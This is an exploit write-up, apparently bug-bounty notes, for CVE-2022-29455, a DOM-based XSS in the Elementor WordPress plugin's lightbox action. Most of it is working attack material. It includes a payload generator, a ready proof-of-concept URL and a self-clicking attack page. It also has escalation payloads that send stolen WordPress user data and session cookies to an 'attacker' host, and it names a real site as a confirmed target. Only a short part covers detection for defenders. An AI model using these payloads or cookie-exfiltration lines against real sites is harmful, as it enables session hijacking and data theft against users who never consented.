# CVE-2022-29455: Elementor DOM XSS via Lightbox

## Overview

- **CVE:** CVE-2022-29455
- **Affected:** Elementor WordPress plugin < 3.5.8
- **Type:** DOM-based Reflected XSS
- **CVSS:** 6.1 (Medium)
- **Auth required:** None (unauthenticated)
- **User interaction:** Victim must click a link

## Vulnerability

Elementor's frontend JavaScript processes `#elementor-action:` URL fragments. When `action=lightbox` with `type=html`, the content is injected directly into the DOM without sanitization.

## Trigger Mechanism

The XSS fires when a user clicks an `<a>` element with an `href` containing the crafted hash. It does NOT auto-fire on page load from URL bar navigation alone — it requires the click event handler on `a[href^="#elementor-action"]`.

### Working Payload (confirmed June 2026)

```python
import base64, json

payload = {
    "type": "html",
    "html": "<img src=x onerror=alert(document.domain)>"
}
b64 = base64.b64encode(json.dumps(payload).encode()).decode()
poc_url = f"https://TARGET/#elementor-action:action=lightbox&settings={b64}"
```

**PoC URL:**
```
https://TARGET/#elementor-action:action=lightbox&settings=eyJ0eXBlIjogImh0bWwiLCAiaHRtbCI6ICI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4ifQ==
```

### XSS Verification Pitfall: Relative src Resolution

When using `<img src=x onerror=...>` as the XSS payload, browsers resolve `x` relative to the current page. If the target returns ANY content for unknown paths (e.g. WordPress 404 page returns HTML with width > 0), the image "loads" and `onerror` never fires.

**Solution:** Use an absolute URL guaranteed to fail DNS resolution:
```html
<img src=https://invalid.invalid/x.png onerror=alert(document.domain)>
```

**Confirmed on line-works.com (June 2026):** `src=x` resolved to `https://line-works.com/x` which returned a 404 page (naturalWidth=26). Using `src=https://invalid.invalid/x.png` triggered onerror correctly.

### Payloads That DO NOT Work

| Type | Payload | Result |
|------|---------|--------|
| `type: "image"` | description with XSS | Lightbox opens, description sanitized |
| `type: "video"` | url with XSS | Lightbox opens, URL not rendered as HTML |
| `type: "html"` | `<img src=x onerror=...>` | **WORKS** — injected into DOM |

## Verification Steps

1. **Confirm version:** Check `elementor/assets/js/frontend.min.js?ver=X.Y.Z`
2. **Confirm handler exists:** Search page source for `elementor-action` or check frontend.js for `a[href^="#elementor-action"]`
3. **Test in browser console:**
```javascript
const payload = btoa(JSON.stringify({"type":"html","html":"<img src=x onerror=alert(document.domain)>"}));
const link = document.createElement('a');
link.href = '#elementor-action:action=lightbox&settings=' + payload;
document.body.appendChild(link);
link.click();
```
4. **Verify injection:** `document.querySelector('img[src="x"]')` should exist in `.elementor-lightbox`

## Self-Triggering Attack Page

```html
<html><body>
<a id="x" href="https://TARGET/#elementor-action:action=lightbox&settings=eyJ0eXBlIjogImh0bWwiLCAiaHRtbCI6ICI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4ifQ==">Click</a>
<script>document.getElementById('x').click();</script>
</body></html>
```

## Escalation Chains

### With nginx case-sensitivity bypass (see nginx-case-sensitivity-bypass.md)
If nginx blocks `/wp-json/wp/v2/users` but the bypass (`/Users`) works:
```javascript
// XSS payload that exfiltrates user data
onerror="fetch('/wp-json/wp/v2/Users',{credentials:'same-origin',headers:{'X-WP-Nonce':window.wpApiSettings?.nonce}}).then(r=>r.json()).then(d=>new Image().src='https://attacker/c?d='+btoa(JSON.stringify(d)))"
```

### Session hijack
```javascript
onerror="new Image().src='https://attacker/c?c='+document.cookie"
```

## CRITICAL FALSE POSITIVE: Elementor Pro Override

**LINE WORKS lesson (June 2026):** Elementor Free 3.5.6 (vulnerable) was detected via `elementorFrontendConfig.version`, lightbox was enabled (`global_image_lightbox:"yes"`), and `frontend.min.js?ver=3.5.6` was loaded. However, **Elementor Pro 3.6.3 was ALSO loaded** and it overrides the Free version's URL actions handler.

**Diagnosis:**
```javascript
// Check registered actions
elementorFrontend.utils.urlActions.getSettings('actions')
// Returns: {} ← EMPTY = lightbox action NOT registered = XSS WILL NOT FIRE
```

**What happens:** Pro's `webpack-pro.runtime.min.js` and `frontend.min.js?ver=3.6.3` load AFTER Free's scripts. Pro re-initializes the urlActions module with an empty actions map, effectively patching the vulnerability without bumping the Free plugin version.

**Detection rule:** Before claiming exploitable:
1. Check for Pro scripts: `document.querySelectorAll('script[src*="elementor-pro"]')`
2. If Pro exists AND Pro version >= 3.6.0 → LIKELY PATCHED regardless of Free version
3. Verify by checking `elementorFrontend.utils.urlActions.getSettings('actions')` — if empty object, the XSS handler is dead
4. Also check: `elementorFrontend.utils.urlActions.runHashAction()` — if it returns without DOM change, confirmed dead

**Bottom line:** Version number alone is NOT sufficient. Must verify the action handler is actually registered and functional. A page can show Elementor 3.5.6 AND be unexploitable due to Pro override.

## Detection (for defenders)

- Check Elementor version: `wp-content/plugins/elementor/readme.txt` → Stable tag
- Vulnerable: < 3.5.8
- Fixed: >= 3.5.8 (sanitizes lightbox settings before DOM insertion)
- Also fixed by: Elementor Pro >= 3.6.0 (overrides action registration)

## Bug Bounty Notes

- NOT self-XSS (attacker crafts URL, victim clicks)
- NOT "script execution that does not affect users" (executes in OTHER user's browser)
- Requires user interaction (click) — this is standard for reflected/DOM XSS
- Programs excluding "Self XSS" should still accept this
- Severity: Medium standalone, High if chained with nginx bypass for data exfiltration
